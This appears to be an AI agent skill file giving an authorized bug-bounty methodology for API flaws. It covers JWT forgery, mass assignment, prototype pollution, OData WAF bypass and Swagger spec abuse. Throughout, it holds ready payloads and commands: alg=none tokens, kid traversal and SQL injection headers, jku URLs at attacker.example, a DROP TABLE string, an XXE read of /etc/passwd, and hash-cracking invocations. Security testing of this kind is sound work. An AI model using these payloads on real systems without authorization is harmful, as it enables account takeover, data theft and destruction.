---
name: hunt-api-misconfig
description: "Hunt API security misconfiguration — mass assignment, JWT attacks, prototype pollution, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT: alg=none, weak HMAC bruteforce, kid path traversal, JWK injection, token confusion. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, XSS in browser). HTTP verb: GET-bypass-CSRF, X-HTTP-Method-Override, TRACE enabled. Detection: API responses with extra fields, JWTs in headers (decode at jwt.io). CORS misconfiguration (reflect-any-origin, null origin, subdomain-regex bypass, postMessage) is owned by hunt-cors. Use when hunting API misconfigs, JWT flaws, mass-assignment, prototype pollution."
---

# HUNT-API-MISCONFIG — API Security Misconfiguration

Authorized-engagement methodology. Every technique below assumes the target is in scope (signed SOW / accepted bug-bounty program), you are testing accounts you own or have written permission to touch, and destructive proof (`DROP TABLE`, mass data pull) is replaced with a minimal non-destructive oracle. JWT forgery, mass-assignment privilege escalation, and prototype pollution all cross authorization boundaries — treat them like any privesc: demonstrate on a controlled second account (test account B), never on real user data.

## Validation & False-Positives (Gate 0)

Run this gate BEFORE writing any finding from this skill. A permissive-looking response is not a vulnerability until you cross a trust boundary with it.

1. **JWT — did the SERVER accept the forged token, or did you only decode it?** Decoding a JWT proves nothing (all JWTs are readable). The finding exists only when a tampered token (alg=none, forged HMAC, confused key) is presented to a protected endpoint and the server returns the privileged resource. Prove with a request/response pair: forged token in → 200 + victim-B/admin data out. `jwt_tool ... -t <url> -rh` reports the actual HTTP verdict — trust that, not the local decode.
2. **Mass assignment — did the extra field CHANGE server state?** Sending `{"isAdmin":true}` and getting a 200 is not proof; the binder may have silently dropped the field. Re-read the object back (`GET` after `PATCH`) and confirm the privileged field actually flipped, then confirm the new privilege is *enforced* (you can now reach an admin-only route). No enforced privilege change = informational.
3. **Prototype pollution — did you reflect a key, or reach a sink?** A polluted key echoed on a later request is a confirmed pollution primitive but only Low/Medium on its own. Critical requires reaching a sink (auth check reading the polluted property → privesc; a Node gadget → RCE, owned by `hunt-nodejs`). State which one you demonstrated.
4. **Second-account discipline.** For any privilege/identity claim, take over or read *test account B* (owned/authorized) from attacker A's session. A change that only affects your own account is not an authorization finding.
5. **Common false positives to kill:** JWT `alg=none` accepted only by a client-side decoder library you control (not the server); `jku`/`x5u` pointing at attacker JWKS but the server pins issuers (request never leaves); mass-assignment field accepted into a DTO but ignored by the ORM; `__proto__` accepted by `JSON.parse` but the app never merges it into a shared object.

---

## Class 1 — JWT Attacks (deep)

Full attack surface for JSON Web Tokens used as the API auth wall. Automate the whole matrix with `jwt_tool` (see the automation block at the end of this class). The raw copy-paste payload catalog (alg=none template, kid traversal strings, JWK/jku blobs) lives in **`security-arsenal`** — pull it there rather than re-transcribing; this section is the *methodology and decision tree*.

> Demo tokens below are deliberately truncated three-part strings (`header.payload.` with an empty/garbage signature) so they are obviously non-functional. Never paste a real signed token into a skill.

### 1a. `alg: none` / algorithm stripping

Set the header algorithm to `none` (also try `None`, `NONE`, `nOnE` — case-normalization bugs) and drop the signature entirely, keeping the trailing dot.

```
# Obviously-fake demo token — header {"alg":"none"} . payload {"user":"admin"} . (empty sig)
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

Verdict is server-side only: present it to a protected route. If the server honors it, signature verification was skipped when `alg` said so. Root cause: verifier calls a generic `verify(token, key)` that treats `none` as a valid family. Disclosed reality: **CVE-2015-9235** (jsonwebtoken ≤4.2.1 accepted `alg:none`), **CVE-2016-5431 / CVE-2016-10555** (auth0/node-jsonwebtoken family), and the class was still live years later — **CVE-2022-23540** (jsonwebtoken ≤8.5.1 allowed insecure `none`/algorithm defaults).

### 1b. Weak-HMAC secret crack (HS256/384/512)

If the token is HMAC-signed, the whole scheme collapses to guessing one shared secret. Capture a valid token and crack offline.

```bash
# jwt_tool built-in dictionary crack
jwt_tool <TOKEN> -C -d /path/to/wordlist.txt          # -C crack HMAC, -d dictionary

# or feed hashcat mode 16500 (JWT) — see security-arsenal for the exact invocation
hashcat -a 0 -m 16500 token.jwt wordlist.txt
```

Once the secret is recovered, forge any claims (`sub`, `role`, `admin`) and re-sign with the same secret — the server validates it as genuine. Cracked-secret cases are extremely common where teams ship a tutorial default like `secret`, `your-256-bit-secret`, or the framework name. Confirm by forging a token for test account B and reading B's data.

### 1c. RS256 → HS256 key confusion

Asymmetric verifiers that dispatch on the token's own `alg` header can be tricked into HMAC-verifying with the **public** key (which is, by definition, public) as the HMAC secret.

```
Server publishes RS256 public key at /.well-known/jwks.json or /jwks
1. Fetch the PEM/JWK public key.
2. Re-sign the payload as HS256 using that public key bytes as the HMAC secret.
3. Header now says {"alg":"HS256"}; server's verify() uses the RSA public key as an HMAC key → matches.
```

```bash
jwt_tool <TOKEN> -X k -pk public.pem        # -X k = key-confusion exploit, -pk = attacker-known public key
```

Root cause: `verify(token, publicKey)` where the library picks the algorithm from the attacker-controlled header instead of a server-pinned allowlist. Disclosed: **8x8 / Jitsi-Meet** (H1 #1210502) — asymmetric verifier admitted an HS256 token signed with the published public key (see `hunt-auth-bypass`, which owns the full auth-wall JWT report set — cross-link, not duplicated).

### 1d. `kid` header injection — path traversal, SQLi, command

The `kid` (key ID) header selects which key the server loads. If it is concatenated into a filesystem path, SQL query, or shell without sanitization, it becomes an injection point *and* a way to force a key the attacker controls.

```
# Point kid at a predictable file whose contents the attacker knows → forge HMAC with those bytes
{"alg":"HS256","kid":"../../../../dev/null"}    # key = empty → sign with empty secret
{"alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space"}   # known static content
# SQLi in kid: server does SELECT key FROM keys WHERE kid='<kid>'
{"alg":"HS256","kid":"nonexistent' UNION SELECT 'attacker-known-secret'-- -"}
```

Force the server to sign/verify against a key value the attacker knows, then forge freely. `jwt_tool <TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""` injects the header claim and re-signs. Real precedent: `kid`-driven directory traversal and SQL injection are documented across the jwt_tool playbook and multiple H1 reports; combine with `hunt-sqli` / `hunt-lfi` when `kid` reaches those sinks.

### 1e. `jku` / `x5u` SSRF → attacker-hosted JWKS

`jku` (JWK Set URL) and `x5u` (X.509 URL) headers tell the verifier where to fetch the verification key. If the server fetches the URL without an allowlist, host your own JWKS and sign with the matching private key.

```
{"alg":"RS256","jku":"https://attacker.example/jwks.json"}   # server fetches attacker key set
{"alg":"RS256","x5u":"https://attacker.example/cert.pem"}
```

Two findings in one: (a) SSRF — the server makes an outbound request to an attacker URL (chain to `hunt-ssrf` for internal-network / IMDS pivots); (b) full auth bypass — the server verifies the forged token against the attacker's public key. Bypass tricks when a naive allowlist exists: `jku` hosted on an open-redirect on the trusted domain, or `https://trusted.tld@attacker.example/jwks.json`. `jwt_tool <TOKEN> -X s -ju https://attacker.example/jwks.json` (jku spoof) / `-X i` for the embedded-jwk variant below.

### 1f. Embedded `jwk` header (self-signed key injection)

Some verifiers trust a public key embedded directly in the token's own `jwk` header — the token carries the very key used to check it. Generate a keypair, embed your public key in `jwk`, sign with your private key.

```
{"alg":"RS256","jwk":{"kty":"RSA","n":"<attacker-modulus>","e":"AQAB"}}
```

`jwt_tool <TOKEN> -X i` performs the embedded-jwk injection automatically. Disclosed: **CVE-2018-0114** (Cisco node-jose / `jku`-embedded-key family — verifier trusted a key supplied inside the JWS). Root cause identical to jku: key material must come from server config, never from the token.

### JWT automation with jwt_tool

`jwt_tool` (external arsenal — `pipx install jwt-tool`; see `external_arsenal.sh`) runs the entire matrix above against a live endpoint and reports the real HTTP verdict, satisfying Gate 0 item 1.

```bash
# One-shot "all attacks" scan against a live protected endpoint (authoritative server-side verdict)
jwt_tool <TOKEN> -M at \
  -t "https://target.example/api/me" \
  -rh "Authorization: Bearer <TOKEN>"
#   -M at  = run all Attacks + Tampering checks (alg:none, HS/RS confusion, injection probes)
#   -t/-rh = replay each forged token live so the tool records 200-vs-401 per attack

# Targeted single techniques:
jwt_tool <TOKEN> -X a                 # alg:none family
jwt_tool <TOKEN> -C -d wordlist.txt   # crack weak HMAC secret
jwt_tool <TOKEN> -X k -pk public.pem  # RS256->HS256 key confusion
jwt_tool <TOKEN> -X i                 # embedded-jwk injection
jwt_tool <TOKEN> -X s -ju https://attacker.example/jwks.json   # jku spoof (SSRF + forge)
```

---

## Class 2 — Mass Assignment (deep)

The API binds the entire request body onto a backend model, so any field the attacker adds is written — including fields the UI never exposes. This is OWASP **API6:2023 Mass Assignment / BOPLA**. The privileged-field wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`, …) lives in **`security-arsenal`** — pull it there; below is the injection methodology and the gadget→sink map.

### Where to inject

Any state-changing endpoint that echoes an object: signup, profile update, account settings, password reset, cart/order, and especially "update my own object" (`PATCH /users/me`). Build the exact field list from a leaked spec — a Swagger `components.schemas.UserUpdateDto` (see the Swagger section below) or an over-exposed GET response (see Excessive Data Exposure) hands you every server-side field name for free.

### Injection fields → sink (gadget → sink map)

| Injected field(s) | Server-side sink | Impact if bound |
|---|---|---|
| `role` / `isAdmin` / `is_staff` / `admin` / `userType` | authorization check reads the role column | vertical privesc → admin |
| `author` / `owner_id` / `user_id` / `createdBy` | ownership assignment on create | write objects *as* / *owned by* victim B → IDOR/impersonation |
| `verified` / `emailVerified` / `isActive` / `approved` | gate that normally requires email/OTP/admin approval | skip verification workflow |
| `org_id` / `tenant_id` / `account_id` / `groupId` | multi-tenant scoping | cross-tenant object write / tenant hop |
| `balance` / `credit` / `price` / `discount` / `quantity` | billing/ledger field | financial manipulation (chain `hunt-business-logic`) |
| `id` / `uuid` on create | primary-key override | overwrite/collide another record |
| `password` / `passwordHash` on a non-password endpoint | credential column written by a profile update | set victim's credential → ATO |

### Probe

```bash
# 1. Baseline: PATCH your own profile with a legit field, capture the response object shape.
curl -s -X PATCH https://target.example/api/users/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"displayName":"probe"}' | jq

# 2. Inject a privileged field alongside the legit one.
curl -s -X PATCH https://target.example/api/users/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"displayName":"probe","role":"admin","emailVerified":true}' | jq

# 3. GATE 0 item 2 — read it BACK and confirm the field actually flipped, then confirm enforcement.
curl -s https://target.example/api/users/me -H "Authorization: Bearer $TOKEN" | jq '{role,emailVerified}'
curl -s -o /dev/null -w '%{http_code}\n' https://target.example/api/admin/dashboard -H "Authorization: Bearer $TOKEN"
```

Root cause: a single model used for both read and write (`[FromBody] User` in ASP.NET, `Model.objects.create(**request.data)` in Django, `User.update(req.body)` in Express/Sequelize) instead of an explicit read-vs-write DTO / allowlist. Signup is the fastest path — set `role=admin` at registration (chain `hunt-ato`). The `author`/`owner_id` injection is the mass-assignment path to writing objects as another user (a create-side IDOR — coordinate with `hunt-idor`).

---

## Class 3 — Prototype Pollution (server-side)

Injecting `__proto__` / `constructor.prototype` keys into a structure the server later merges into a shared object pollutes `Object.prototype` for the whole process, so an attacker-controlled property appears on *every* object. This section covers the **API-surface detection and the auth-bypass sink**; the Node.js RCE gadget chains (lodash/EJS/`child_process`/`NODE_OPTIONS` sinks) are owned by **`hunt-nodejs`** — cross-link, do not duplicate its JS depth.

### Injection vectors (server-side)

```
# JSON body — reaches any recursive merge / _.merge / Object.assign / deep-extend
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

# Query / form (qs, express) — bracket notation
?__proto__[isAdmin]=true
?constructor[prototype][role]=admin
```

### The API-relevant sink: pollution → authorization bypass

The sink most relevant to *API misconfig* (as opposed to RCE) is an access-control check that reads a property off a plain object which the attacker has polluted. If the code does `if (user.isAdmin)` and `user` is `{}` from a fresh `JSON.parse`, a polluted `Object.prototype.isAdmin=true` makes the check pass for everyone.

```
1. Pollute: POST {"__proto__":{"isAdmin":true}} to any endpoint that deep-merges the body into config/session/options.
2. Confirm reflection (Gate 0 item 3): a later, clean request now returns a property you never sent, e.g.
   GET /api/me -> {"isAdmin": true}   # you never set it on your user
3. Reach the sink: call an admin-gated route; if the gate reads the polluted prop, you now pass it.
```

Disclosed precedent for the pollution → privilege/bypass class: **CVE-2019-10744** (lodash `defaultsDeep` prototype pollution, the canonical library CVE), **CVE-2021-23337** (lodash `template` — pollution reaching a code sink), and Kibana **CVE-2019-7609** (prototype-pollution chained to server-side RCE in a real product). Detection payloads and the qs/query variants also appear in `hunt-nodejs` Phase 2.

**Escalation routing:** pollution → auth-bypass property stays here (API misconfig). Pollution → `child_process`/`options.shell`/`NODE_OPTIONS`/template-engine RCE routes to **`hunt-nodejs`** (owns the sink gadget chains) and terminates in **`hunt-rce`**. Do not re-derive those payloads here.

---

## CORS Exploitation

CORS misconfiguration (reflect-any-origin, `null` origin, subdomain-regex bypass, postMessage) is owned by **`hunt-cors`** — see that skill. Quick smell test only:

```bash
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# ACAO: https://evil.com + ACAC: true → hand off to hunt-cors for the credentialed-read PoC
```

---

## Excessive Data Exposure — endpoint returns password hash / sensitive fields

OWASP API Top 10 **API3:2023 Excessive Data Exposure**. The API serialises the full backend object and relies on the client to filter what it shows. The UI renders three fields; the JSON body carries fifteen — including auth/PII/secret fields that should never cross the wire. Always diff the raw API JSON against what the UI actually renders, and flag any auth, PII, or secret field present in the response body.

### OWASP Juice Shop reality (base `http://localhost:3000`)

The REST endpoints echo the entire Sequelize `User` model, including the bcrypt `password` hash, `role`, `totpSecret`, and `deluxeToken` — fields the Angular front-end never displays. Reading your own (or any) user object reveals the hash directly.

- `GET /rest/user/whoami` — returns the current session's user object; check whether it leaks more than `id` + `email`.
- `GET /api/Users/{id}` — the generated REST CRUD route serialises the full user record (`password`, `role`, `totpSecret`, `deluxeToken`, `isActive`).
- `GET /api/Users` — list endpoint; the same excessive fields multiplied across every account.

```bash
# Probe 1 — whoami leaking beyond id/email
curl -s http://localhost:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | jq

# Probe 2 — single user object echoing its own bcrypt password hash + privileged fields
curl -s http://localhost:3000/api/Users/1 | jq \
  '.data | {id, email, password, role, totpSecret, deluxeToken}'
# Look for: "password":"$2a$..." (bcrypt), "role":"admin", non-null totpSecret/deluxeToken

# Probe 3 — list endpoint exposing hashes for every account at once
curl -s http://localhost:3000/api/Users | jq \
  '.data[] | {id, email, password, role}'
```

Any `"password":"$2a$..."` / `$2b$` / `$2y$` bcrypt string in the body confirms the leak. Crack offline (hashcat `-m 3200`) or pivot the exposed `role` / `deluxeToken` for privilege context.

- Unlocks: **Password Hash Leak** (retrieve a password hash that is not yours via the API).
- Assists: **GDPR Data Theft** (the over-exposed user records are the PII set you exfiltrate).

### General checklist (any target, not just Juice Shop)

1. Capture every authenticated API response that backs a profile/account/admin view.
2. Diff the JSON object against the rendered DOM — list every field present in the body but absent from the UI.
3. Flag and report any of these in the body: `password` / `passwordHash` / `pwd`, `role` / `isAdmin` / `permissions`, `totpSecret` / `mfaSecret` / `otp`, `deluxeToken` / `apiKey` / `token` / `secret`, internal IDs, full PAN/SSN/DOB and other PII.
4. Hashes to recognise: bcrypt (`$2a$`/`$2b$`/`$2y$`), `$argon2`, MD5/SHA hex, `{SSHA}` — any of these in a client-facing body is a finding.
5. Repeat against list/search/export endpoints — excessive exposure is worse at scale.

---

## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)

OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.

### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`

```
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
```

Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))

### Attack class 2 — `$orderby` / `$select` column-disclosure bypass

```
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
```

`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.

### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations

```
POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.

### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass

```
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
GET /api?%2524filter=...                                # double-encoded
GET /Users(1)/$value                                    # path-segment style
```

Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))

### Attack class 5 — OData → real SQLi when library passes filter raw

```
$filter=Name eq 'x'); DROP TABLE Users--'
```

Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).

### Bonus — `$expand` navigation-property IDOR

```
GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
```

Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).

### Detection heuristics

- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.

---

## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)

NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.

### Default discovery paths (cross-references `web2-recon`)

```
# NSwag / Swashbuckle (ASP.NET Core)
/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json

# Generic OpenAPI
/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources

# Python (FastAPI / Connexion)
/docs, /redoc, /openapi.json

# Quarkus
/q/openapi, /q/swagger-ui

# GraphQL adjacent
/graphql, /graphiql, /playground, /altair, /voyager
```

Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.

### Attack chains

**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.

**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.

**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.

**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))

### Disclosed cases

- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.

### Detection checklist

1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.

---

## Related Skills & Chains

- **`hunt-oauth`** — JWT overlap (cross-link, not duplicated): OAuth/OIDC issues its own JWTs (ID tokens, access tokens) and the same forgery matrix applies at the OAuth layer, but hunt-oauth owns the flow context — `aud`/audience-confusion token replay ("Pass-The-Token"), nonce-not-validated, and the nOAuth mutable-`email`-claim ATO. Chain primitive: forge/confuse a JWT here (alg=none, key confusion, cracked HMAC) → present it to the OAuth-protected API; if the finding is about *how the token flows* (redirect_uri, `aud`, IdP claim trust) it belongs in hunt-oauth, not here.
- **`hunt-nodejs`** — Server-side prototype-pollution JS depth (cross-link, not duplicated): this skill covers pollution → authorization-bypass property; hunt-nodejs owns the RCE gadget chains (lodash `merge`/`template`, EJS/Pug/Handlebars, `options.shell`/`NODE_OPTIONS`/`child_process` sinks) and the qs/Express injection Phases. Chain primitive: confirm pollution reflection here → route to hunt-nodejs to reach an exec sink.
- **`hunt-ato`** — Mass assignment on signup/profile and JWT forgery are the fastest paths to admin/impersonation; hunt-ato owns the 9-path ATO taxonomy and the take-over-account-B discipline. Chain primitive: mass-assign `role=admin` at signup, or forge a JWT `sub`=victim, then demonstrate takeover of test account B per hunt-ato Gate.
- **`hunt-auth-bypass`** — Owns the full JWT auth-wall disclosed report set (alg-confusion Jitsi, audience-confusion Argo CD, signature-skip). Chain primitive: JWT `alg=none`/key-confusion forged here → impersonate any user by setting `sub` to victim ID; see hunt-auth-bypass for the report precedents.
- **`hunt-ssrf`** — The `jku`/`x5u` JWT headers make the verifier fetch an attacker URL. Chain primitive: `jku` SSRF → internal-network / IMDS pivot per hunt-ssrf, in addition to the auth bypass.
- **`hunt-cors`** — Owns all CORS exploitation (reflect-any-origin, `null`, subdomain-regex, postMessage). Chain primitive: permissive ACAO+ACAC smelled here → hand off for the credentialed cross-origin read PoC.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK, RS256→HS256, `hashcat -m 16500`) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`) — the raw payloads live there, referenced not re-transcribed.
- **`triage-validation`** — Apply the Server-Policy-vs-State gate alongside this skill's Gate 0: a permissive CORS header, a decoded JWT, or a 200 on a mass-assign probe is informational until you show a crossed trust boundary (forged-token 200, flipped-and-enforced privilege, pollution reaching a sink).

